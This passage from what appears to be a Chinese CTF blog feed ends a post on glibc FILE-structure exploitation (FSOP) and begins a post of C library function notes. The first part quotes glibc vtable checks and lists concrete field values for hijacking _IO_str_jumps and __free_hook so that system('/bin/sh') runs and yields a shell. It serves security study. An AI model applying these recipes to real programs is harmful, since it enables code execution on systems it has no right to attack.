validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><hr><p>不过这个检查其实并不是非常严格</p><p>如果只是在vtable所在段内进行劫持并不一定会触发错误</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h3 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h3><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h3 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h3><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常见但总记不清的c库函数和python方法</title>
      <link href="/posts/38626/"/>
      <url>/posts/38626/</url>
      
        <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets"></a>fgets</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">int</span> n, FILE *<span class="keyword">restrict</span> stream)</span>`;</span><br></pre></td></tr></table></figure><p>从流stream中读取n个字符并写入s字符串中</p><h1 id="isoc99-sscanf"><a href="#isoc99-sscanf" class="headerlink" title="__isoc99_sscanf"></a>__isoc99_sscanf</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __isoc99_sscanf(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...);</span><br></pre></td></tr></table></figure><p>从字符串s中按格式化字符串format写到指定位置</p><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>ptr</code>：指向读取数据存储位置的指针；</li><li><code>size</code>：每个数据块的字节数；</li><li><code>count</code>：数据块的个数；</li><li><code>stream</code>：文件指针，指向要读取的文件。</li><li>函数返回值为实际读取的数据块数目，如果发生错误或者已经到达文件结尾，则返回值可能小于 <code>count</code>。</li></ul><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p><code>fopen</code>函数的原型在标准C库（stdio.h头文件）中声明，其原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">FILE *fopen(const char *filename, const char *mode);</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><p><code>filename</code>是一个字符串，表示要打开的文件的路径和名称。</p></li><li><p>```<br>mode是一个字符串，表示文件打开的模式。模式字符串可以包含以下字符的组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - `&quot;r&quot;`：读取模式（打开文件用于读取）。</span><br><span class="line">  - `&quot;w&quot;`：写入模式（创建新文件或截断现有文件）。</span><br><span class="line">  - `&quot;a&quot;`：追加模式（写入文件，如果文件不存在则创建）。</span><br><span class="line">  - `&quot;b&quot;`：二进制模式。</span><br><span class="line">  - `&quot;t&quot;`：文本模式（默认）。</span><br><span class="line"></span><br><span class="line">返回值是一个指向`FILE`类型的指针，如果打开文件失败，则返回`NULL`指针。</span><br><span class="line"></span><br><span class="line">### 注意:</span><br><span class="line"></span><br><span class="line">**fopen和open的返回值是不一样的,fopen返回一个IO_FILE指针,open返回文件描述符**</span><br><span class="line"></span><br><span class="line">## strtol</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">long int strtol(const char *nptr, char **endptr, int base)</span><br></pre></td></tr></table></figure></li></ul><p>其中，参数含义如下：</p><ul><li><code>nptr</code>：要转换的字符串指针；</li><li><code>endptr</code>：可选输出参数，指向转换停止处的下一个字符的指针，如果该指针为 NULL，则不会返回该值；</li><li><code>base</code>：进制数，可以是 2 ~ 36 之间的任意值，或者特殊值 0，表示根据 <code>nptr</code> 的前缀来确定进制数（”0x” 或 “0X” 表示 16 进制，”0” 表示 8 进制，否则默认为 10 进制）。</li></ul><p>函数返回值为转换后的长整型数值。如果转换失败，返回值为 0，同时设置 <code>endptr</code> 为 <code>nptr</code>，并将 <code>errno</code> 设置为 <code>EINVAL</code> 或 <code>ERANGE</code>。</p><p>需要注意的是，由于 <code>strtol</code> 函数不支持无符号长整型，因此如果需要将字符串转换为无符号长整型，可以使用 <code>strtoul</code> 函数。</p><p>且strtol只能转换数字组成的字符串</p><h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><p>与前者相似</p><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><p><code>int sprintf(char *str, const char *format, ...);</code></p><p>sprintf 的作用是将格式化的数据写入字符串中，根据格式化字符串中的占位符，将相应的数据转换成字符串，并将结果写入到目标字符串中。它在格式化字符串和实际数据之间建立了一个对应关系，方便将数据以指定的格式组合成字符串</p><p>主体依然是char *format</p><p><strong>但其本身并不具有打印功能</strong></p><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li><p><code>addr</code>：指定映射的起始地址，通常设为0，表示由系统自动选择地址。</p></li><li><p><code>length</code>：指定映射的长度，以字节为单位。</p></li><li><p>```<br>prot</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ：指定内存保护标志，用于限制对映射区域的访问权限。可以使用以下标志的按位或进行组合：</span><br><span class="line"></span><br><span class="line">  - `PROT_EXEC`：可执行权限，允许在映射区域中执行代码。</span><br><span class="line">  - `PROT_READ`：可读权限，允许读取映射区域中的内容。</span><br><span class="line">  - `PROT_WRITE`：可写权限，允许写入映射区域中的内容。</span><br><span class="line">  - `PROT_NONE`：无权限，禁止对映射区域进行任何访问。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  